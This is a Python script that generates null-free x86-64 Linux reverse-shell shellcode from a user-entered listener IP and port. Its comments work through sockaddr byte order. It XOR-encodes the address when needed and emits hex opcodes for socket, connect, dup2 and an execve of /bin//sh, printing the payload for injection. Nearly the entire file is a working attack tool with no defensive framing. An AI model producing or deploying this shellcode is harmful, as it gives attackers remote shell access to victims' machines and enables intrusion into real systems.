#!/usr/bin/python3
import socket
import struct

def get_rev_hex(ip, port):
    # 1. Form 8 bytes for sockaddr_in
    # Structure: [IP (4)] [Port (2)] [AF_INET (2)]
    # Little Endian for stack: 0xIP_Port_Family
    
    # IP parts
    ip_parts = [int(x) for x in ip.split('.')]
    ip_val = (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (ip_parts[3] << 24) # Little Endian IP? 
    # Wait, inet_addr is usually Network Byte Order (Big Endian) 
    # 127.0.0.1 -> 7F 00 00 01 in memory
    # Stack (low to high): 02 00 (Fam), P1 P2 (Port), I1 I2 I3 I4 (IP)
    # 64-bit integer view (Little Endian CPU loading):
    # Byte 0: 02
    # Byte 1: 00
    # Byte 2: P1 (High part of port? No, Network order is Big Endian)
    # Port 4444 (0x115c). Network: 11 5c. Memory: 11 5c.
    # IP 127.0.0.1. Network: 7f 00 00 01. Memory: 7f 00 00 01.
    # Full 8 bytes in memory: 02 00 11 5c 7f 00 00 01
    # Little Endian Integer: 0x0100007f5c110002
    
    # Correct calculation:
    family = 0x0002
    port_net = struct.pack('>H', port) # Big Endian
    ip_net = socket.inet_aton(ip)      # Big Endian (Standard)
    
    full_bytes = struct.pack('<H', family) + port_net + ip_net
    val_int = struct.unpack('<Q', full_bytes)[0]
    
    # 2. Check for NULL bytes and generate MOV
    # If there are zeros, use XOR/ADD obfuscation
    import random
    
    def has_null(v):
        return b'\x00' in struct.pack('<Q', v)

    shell_struct = ""
    
    if not has_null(val_int):
        # Normal MOV RCX, IMM; PUSH RCX
        # 48 b9 + 8 bytes
        shell_struct = "48b9" + struct.pack('<Q', val_int).hex() + "51"
    else:
        # XOR Encoder
        # Find a key K such that K and (VAL ^ K) do not have zeros
        while True:
            key = random.getrandbits(64)
            xor_val = val_int ^ key
            if not has_null(key) and not has_null(xor_val):
                break
        
        # MOV RBX, xor_val  (48 bb ...)
        # MOV RCX, key      (48 b9 ...)
        # XOR RCX, RBX      (48 31 d9) -> result in RCX
        # PUSH RCX          (51)
        shell_struct = (
            "48bb" + struct.pack('<Q', xor_val).hex() +
            "48b9" + struct.pack('<Q', key).hex() +
            "4831d9" +
            "51"
        )
            
    # 3. Assemble full shellcode
    shellcode = (
        "6a29586a025f6a015e990f05" # socket
        "505f"                     # save fd to rdi (xchg or push/pop)
        + shell_struct +           # generated sockaddr push
        "4889e66a105a6a2a580f05"   # connect
        "6a035e48ffce6a21580f0575f6" # dup2 loop
        "4831f65648bb2f62696e2f2f736853545f996a3b580f05" # execve
    )
    
    return shellcode

# --- INTERACTIVE INPUT ---
try:
    print("--- SHELLCODE GENERATOR ---")
    my_ip = input("Enter LHOST (IP): ").strip()
    if not my_ip: my_ip = "127.0.0.1"
    
    my_port_str = input("Enter LPORT (Default 4444): ").strip()
    my_port = int(my_port_str) if my_port_str else 4444

    raw_hex = get_rev_hex(my_ip, my_port)
    print(f"\n[*] Generated Shellcode for {my_ip}:{my_port}")
    print(f"[*] Size: {len(raw_hex)//2} bytes")
    if "00" in raw_hex:
        print("[!] WARNING: NULL bytes detected (bad for strcpy, good for XOR loader).")
    else:
        print("[+] SUCCESS: No NULL bytes detected.")
        
    print(f"\nPayload:\n{raw_hex}")

except Exception as e:
    print(f"Error: {e}")
